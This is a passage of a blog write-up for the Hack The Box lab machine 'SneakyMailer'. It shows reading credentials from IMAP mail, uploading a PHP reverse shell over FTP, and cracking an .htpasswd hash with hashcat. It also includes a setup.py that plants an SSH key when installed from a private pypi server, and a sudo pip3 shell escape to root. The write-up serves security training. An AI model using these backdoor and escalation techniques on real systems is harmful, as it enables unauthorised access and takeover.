                                                    <li class="py-2">0 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht</li> <li class="py-2">we get logged in succesfully</li>
                                            
                                                    <img src="/hackthebox/sneakymailer/3.png" class="port" class="py-3" class="width= 100%" height="125" alt="">
                                            
                                                    <li class="py-2">after this I list all directories in the mail box</li>
                                                    <li class="py-2">using this command:</li>
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">0 LIST ââ â*â</code></li>
                                                    <li class="py-2">Selecting sent items:</li>
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">0 select âINBOX.Sent Itemsâ</code></li>
                                                    <li class="py-2">looking how many messages are in there:</li>
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">f fetch 1:4 (BODY[HEADER.FIELDS (Subject)])</code></li>
                                                    <li class="py-2">Read message:</li>
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">F1 fetch 1 RFC822</code></li>
                                            
                                                    <img src="/hackthebox/sneakymailer/4.png" class="port" class="py-3" class="width= 100%" height="880px" alt="">
                                            
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">Username: developer</code></li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge"> m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code></li>
                                                    <li class="py-1">Now I tried to login using these credentials on ftp server</li>
                                                    <li class="py-1">ftp 10.10.10.197</li>
                                                    <li class="py-1">developer</li>
                                                    <li class="py-1">m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</li>
                                                    <li class="py-1">we got root user in ftp</li>
                                                    <li class="py-1">so we try reverse shell through ftp</li>
                                                    <li class="py-1">let's use php reverse shell</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">https://github.com/pentestmonkey/php-reverse-shell</code></li>
                                                    <li class="py-1">uploading shell:</li>
                                                    <li class="py-1">mput dedsec.php (in dev directory)</li>
                                                    <li class="py-1">After playing around and uploading my shell, it didnât seem to work.
                                                    <li class="py-1">after adding another host name I was able to get a shell:</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">http://dev.sneakycorp.htb</code></li>
                                                    <li class="py-1">also the folder dev in the ftp gave a hint away there should be another vhost</li>
                                                    <li class="py-1">using nc -lvp 9001 (you use any port but i use this port)</li>
                                                    <li class="py-1">you can execute your php payload through:</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">http://dev.sneakycorp.htb/dedsec.php</code></li>
                                            
                                                    <img src="/hackthebox/sneakymailer/5.png" class="port" class="py-3" class="width=" 100%" height="500" alt="">
                                            
                                                    <li class="py-2">first su developer and then password m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C then you got the user.txt file</li>
                                                    <li class="py-1">then I Check the /var/www/ files</li>
                                                    <li class="py-1">and we got Something</li>
                                                    <li class="py-1">we got another host</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb (this is running on port 8080)</code></li>
                                                    <li class="py-1">I add it in our /etc/hosts file</li>
                                                    <li class="py-1">when i go in the directory i got .htpasswd file</li>
                                                    <li class="py-1">i tried to read it  and i got some credentials</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code></li>
                                            
                                                    <img src="/hackthebox/sneakymailer/6.png" class="port" class="py-3" class="width=" 100%" height="705" alt="">
                                            
                                                    <li class="py-2">looks like a <code class="language-plaintext highlighter-rouge">md5(apr) hash</code></li>
                                                    <li class="py-1">so i tried  to crack this hash with hashcat using command:</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">hashcat -m 1600 â$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/â /usr/share/wordlists/rockyou.txt âforce</code></li>
                                                    <li class="py-1">and after some time  i found the password</li>
                                                    <li class="py-1"><code class="language-plaintext highlighter-rouge">$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui</code></li>
                                                    <li class="py-1">But question is where to try it</li>
                                                    <li class="py-1">So here we can conclude that we can install package in machine</li>
                                                    <li class="py-1">so what we will be doing is we will be installing them manually so that we could place our script in place of actual package</li>
                                            
                                                    <h1>REFRENCE</h1>
                                            
                                            
                                                    <li><code class="language-plaintext highlighter-rouge">https://pypi.org/project/pypiserver/#upload-with-setuptools</code></li>
                                                    <li><code class="language-plaintext highlighter-rouge">https://www.activestate.com/resources/quick-reads/how-to-manually-install-python-packages/#:~:text=Installing%20Python%20Packages%20with%20Setup,Enter%3A%20python%20setup.py%20install</code></li>
                                                    <li>after channging minor parts in script it will look like</li>
                                            
                                                    <h1>SETUP.PY</h1>
                                            
                                                    <div class="language-bash highlighter-rouge">
                                                    <pre><code style="color: white;">
    import setuptools
        try:
        with open("/home/low/.ssh/authorized_keys", "a") as f:
            f.write("\n") #here you enter your ssh key (id_rsa.pub) after \n
            f.close()
        except Exception as e:
        pass
        setuptools.setup(
        name="example-pkg3", # Replace with your own username
        version="0.0.1",
        author="Example Author",
        author_email="author@example.com",
        description="A small example package",
        long_description="",
        long_description_content_type="text/markdown",
        url="https://github.com/pypa/sampleproject",
        packages=setuptools.find_packages(),
        classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        ],
        )
                                                </code></pre>
                                                </div>
                                            
                                                    <h1>.pypirc</h1>
                                            
                                                    <div class="language-bash highlighter-rouge">
                                                    <pre><code style="color: white;">
    [distutils]
        index-servers = local
    
        [local]
        repository: http://pypi.sneakycorp.htb:8080
        username: pypi
        password: soufianeelhaoui
                                                    </code></pre>
                                                    </div>
                                            
                                                    <img src="/hackthebox/sneakymailer/7.png" class="port" class="py-3" class="width=" 100%" height="398" alt="">
                                            
                                                    <li class="py-2">Just upload both of them in TMP diretory of htb machiene in any folder and run this command</li>
                                                    <pre><code class="python">python3 setup.py sdist register -r local upload -r local</code></pre>
                                            
                                            
                                                    <h1>whole scenario looks like this :</h1>
                                            
                                                    <div class="language-bash highlighter-rouge">
                                                    <pre><code style="color: white;">
    developer@sneakymailer:/$ cd /tmp
    cd /tmp
    ldeveloper@sneakymailer:/tmp$ ls
    ls
    systemd-private-2c8ab75d46924481ac84f56b75c9a067-systemd-timesyncd.service-a5Ynvb
    vmware-root_458-834774610
    developer@sneakymailer:/tmp$ mkdir dedsec
    mkdir dedsec
    cd developer@sneakymailer:/tmp$ cd dedsec
    cd dedsec
    developer@sneakymailer:/tmp/dedsec$ HOME=$(pwd)
    HOME=$(pwd)
    developer@sneakymailer:~$ pwd 
    /tmp/dedsec
    pwd
    developer@sneakymailer:~$ wget http://10.10.15.56/setup.py
    wget http://10.10.15.56/setup.py
    --2020-07-13 01:06:52--  http://10.10.15.56/setup.py
    Connecting to 10.10.15.56:80... connected.
    HTTP request sent, awaiting response... w200 OK
    Length: 1193 (1.2K) [text/plain]
    Saving to: âsetup.pyâ

        0K .                                                     100% 1.94M=0.001s

    2020-07-13 01:06:53 (1.94 MB/s) - âsetup.pyâ saved [1193/1193]

    developer@sneakymailer:~$wget http://10.10.15.56/.pypirc
    wget http://10.10.15.56/.pypirc
    --2020-07-13 01:07:05--  http://10.10.15.56/.pypirc
    Connecting to 10.10.15.56:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 128 [application/octet-stream]
    Saving to: â.pypircâ

        0K                                                       100% 19.6M=0s

    2020-07-13 01:07:07 (19.6 MB/s) - â.pypircâ saved [128/128]

    developer@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local
    <n3 setup.py sdist register -r local upload -r local
    running sdist
    running egg_info
    creating example_pkg3.egg-info
    writing example_pkg3.egg-info/PKG-INFO
    writing dependency_links to example_pkg3.egg-info/dependency_links.txt
    writing top-level names to example_pkg3.egg-info/top_level.txt
    writing manifest file 'example_pkg3.egg-info/SOURCES.txt'
    reading manifest file 'example_pkg3.egg-info/SOURCES.txt'
    writing manifest file 'example_pkg3.egg-info/SOURCES.txt'
    warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

    running check
    creating example-pkg3-0.0.1
    creating example-pkg3-0.0.1/example_pkg3.egg-info
    copying files to example-pkg3-0.0.1...
    copying setup.py -> example-pkg3-0.0.1
    copying example_pkg3.egg-info/PKG-INFO -> example-pkg3-0.0.1/example_pkg3.egg-info
    copying example_pkg3.egg-info/SOURCES.txt -> example-pkg3-0.0.1/example_pkg3.egg-info
    copying example_pkg3.egg-info/dependency_links.txt -> example-pkg3-0.0.1/example_pkg3.egg-info
    copying example_pkg3.egg-info/top_level.txt -> example-pkg3-0.0.1/example_pkg3.egg-info
    Writing example-pkg3-0.0.1/setup.cfg
    creating dist
    Creating tar archive
    removing 'example-pkg3-0.0.1' (and everything under it)
    running register
    Registering example-pkg3 to http://pypi.sneakycorp.htb:8080
    Server response (200): OK
    WARNING: Registering is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
    running upload
    Submitting dist/example-pkg3-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
    Server response (200): OK
    WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
    developer@sneakymailer:~$
                                                </code></pre>
                                                </div>
                                            
                                                    <li py-2>After this we will get ssh connection </li>
                                                    <li><code class="language-plaintext highlighter-rouge">ssh low@10.10.10.197</code></li>
                                                    <li>if it don't work</li>
                                                    <li>use <code class="language-plaintext highlighter-rouge">chmod 600 </code> id_rsa file</li>
                                                    <li><code class="language-plaintext highlighter-rouge">ssh -i id_rsa low@10.10.10.197</code></li>
                                                    <li>i hope this work for you</li>
                                            
                                                    <h1>Privilege escalation</h1>
                                            
                                                    <li>Here we will be using simple <code class="language-plaintext highlighter-rouge">sudo -l</code> command :</li>
                                                    <div class="language-bash highlighter-rouge">
                                                    <pre><code style="color: white;">
    low@sneakymailer:~$ sudo -l
    
    sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
    Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
    low@sneakymailer:~$ 
                                                    </code></pre>
                                                    </div>
                                                    <li>So we use <code class="language-plaintext highlighter-rouge">https://gtfobins.github.io/</code> to GETTING ROOT ACCESS</li>
                                                    <div class="language-bash highlighter-rouge">
                                                    <pre><code style="color: white;">
    low@sneakymailer:~$ sudo -l
    
    sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
    Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User low may run the following commands on sneakymailer:
        root) NOPASSWD: /usr/bin/pip3
    low@sneakymailer:~$ 
    low@sneakymailer:~$ TF=$(mktemp -d)
    low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    low@sneakymailer:~$ sudo pip3 install $TF
    sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
    Processing /tmp/tmp.qRgHUXIOL0
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # cd /root
    # cat root.txt
    d6xxxxxxxxxxxxxxxxxxxxxxxxxxxxc0
    # 
                                                    </code></pre>
                                                    </div>
                                    <p>And we pwned it â¦â¦.</p>
                                    <p>
                                        If u liked the writeup.Support a Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code>
                                        <a href="https://0xdedinfosec.github.io/tabs/donation/" target="_blank">Donation for OSCP</a>
                                    </p>
                                    <h1 id="resources">Resources</h1>
                                <table>
                                    <thead>
                                        <tr>
                                            <th>Topic
                                            <th>
                                                Url
                                                <tbody><tr><td>email-extractor</td><td><a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a></td></tr><tr><td>pentest-monkey shell</td><td><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></td></tr><tr><td>Setting up package</td><td><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a></td></tr><tr><td>setting up package</td><td><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a></td></tr><tr><td>setting up package</td><td><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/" target="_blank">https://packaging.python.org/guides/distributing-packages-using-setuptools/</a></td></tr><tr><td>Pip-gtfobins</td><td><a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank">https://gtfobins.github.io/gtfobins/pip/</a></td></tr></tbody>
                                            </table>
                    </div>
                    <div class="post-tail-wrapper text-muted">
                        <div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2">
                            <div class="license-wrapper">
                                <span class="license-text ml-1 mr-1">
                                    This post is licensed under 
                                    <a href="https://creativecommons.org/licenses/by/4.0/">
                                        CC BY 4.0 <i class="fab fa-creative-commons"></i>
                                        <i class="fab fa-creative-commons-by"></i>
                                    </a>
                                </span>
                            </div>
                            <div class="share-wrapper">
                                <span class="share-label ml-1 mr-1">Share</span>
                                <span class="share-icon">
                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank">
                                        <i class="fa-fw fab fa-twitter mr-1"></i>
                                    </a>
                                    <a href="https://www.facebook.com/dedsecinfoServices/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank">
                                        <i class="fa-fw fab fa-facebook-square mr-1"></i>
                                    </a>
                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank">
                                        <i class="fa-fw fab fa-telegram mr-1"></i>
                                    </a>
                                    <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down">
                <div class="access">
                    <div id="access-lastmod" class="post mb-4">
                        <h3 data-toc-skip>Recent Update</h3>
                        <ul class="post-content pl-0 pb-1 ml-1 mt-2">
                            <li>
                                <a href="/posts/htb-time/">Hackthebox Time writeup</a>
                            </li>
                            <li>
                                <a href="/posts/htb-jewel/">Hackthebox Jewel writeup</a>
                            </li>
                            <li>
                                <a href="/posts/htb-reel2/">Hackthebox Reel2 writeup</a>
                            </li>
                            <li>
                                <a href="/posts/htb-doctor/">Hackthebox Doctor writeup</a>
                            </li>
                            <li>
                                <a href="/posts/htb-compromised/">Hackthebox Compromised writeup</a>
                            </li>
                        </ul>
                    </div>
                    <div id="access-tags">
                        <h3 data-toc-skip>Trending Tags</h3>
                        <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
                            <a class="post-tag" href="/tags/cve/">CVE</a>
                            <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
                            <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
                            <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
                            <a class="post-tag" href="/tags/ftp/">FTP</a>
                            <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
                            <a class="post-tag" href="/tags/jackson/">Jackson</a>
                            <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
                            <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
                            <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8">
                <div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                    <div class="post-navigation d-flex justify-content-between">
                        <a href="/posts/htb-jewel/" class="btn btn-outline-primary">
                            <p>Hackthebox Jewel writeup</p>
                        </a>
                        <a href="/posts/htb-reel2/" class="btn btn-outline-primary">
                            <p>Fortress Reel2 writeup</p>
                        </a>
                    </div>
                    <!-- Disqus  -->
                    <script id="dsq-count-scr" src="//0xdedinfosec.disqus.com/count.js" async></script>
                    <div id="disqus_thread"></div>
                    <script>
                    var disqus_config = function () {
                    this.page.url = 'https://0xdedinfosec.github.io/posts/htb-sneakymailer/';  
                    this.page.identifier = '/posts/htb-sneakymailer/';
                    };
                    (function() {
                    var d = document, s = d.createElement('script');
                    s.src = 'https://0xdedinfosec.disqus.com/embed.js';
                    s.setAttribute('data-timestamp', +new Date());
                    (d.head || d.body).appendChild(s);
                    })();
                    </script>
                    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                            
                    <!-- Disqus end -->
                    <div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2">
                        <h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
                        <div class="card-deck mb-4">
                            <div class="card">
                                <a href="/posts/htb-jewel/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Oct 29, 2020 <i class="unloaded">2020-10-29T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Jewel writeup</h3>
                                        <div class="text-muted small">
                                            <p>information Column Details Name Jewel IP 10.10.10.211 Points 30 Os Linux ...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                            <div class="card">
                                <a href="/posts/hackthebox-reel2/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Oct 05, 2020 <i class="unloaded">2020-10-05T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Reel2 writeup</h3>
                                        <div class="text-muted small">
                                            <p>information@Sauna:~$ Column Details Name Reel2 IP 10.10.10.210 Points 40 Os Windo...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                            <div class="card">
                                <a href="/posts/htb-doctor/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Sep 28, 2020 <i class="unloaded">2020-09-28T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Doctor writeup</h3>
                                        <div class="text-muted small">
                                            <p>Information@openadmin:~$ Column Details Name Doctor IP 10.10.10.209 Points 20 Os ...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
        <script type="text/javascript">
            const observer = lozad();
            observer.observe();
        </script>
        <footer class="d-flex w-100 justify-content-center">
            <div class="d-flex justify-content-between align-items-center">
                <div class="footer-left">
</p></div>
<p class="mb-0">
    Â© 2020 <a href="https://www.facebook.com/dedsecinfoServices/">Dedinfosec</a>
    . <span data-toggle="tooltip" data-placement="top" title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All rights reserved.</span>
    <script>
        (function(i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function() {
                (i[r].q = i[r].q || []).push(arguments)
            }
            ,
            i[r].l = 1 * new Date();
            a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        }
        )(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
        ga('create', 'UA-157514490-1', 'auto');
        ga('send', 'pageview');
    </script>
</footer></div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
    <div class="col-12 col-xl-11 post-content">
        <div id="search-hints">
            <h4 class="text-muted">Trending Tags</h4>
            <a class="post-tag" href="/tags/cve/">CVE</a>
            <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
            <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
            <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
            <a class="post-tag" href="/tags/ftp/">FTP</a>
            <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
            <a class="post-tag" href="/tags/jackson/">Jackson</a>
            <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
            <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
            <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
        </div>
        <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
    </div>
</div>
</div><div id="mask"></div>
<a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button">
    <i class="fas fa-angle-up"></i>
</a>
<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script>
<script>
    SimpleJekyllSearch({
        searchInput: document.getElementById('search-input'),
        resultsContainer: document.getElementById('search-results'),
        json: '/assets/data/search.json',
        searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xdedinfosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>',
        noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
    });
</script>
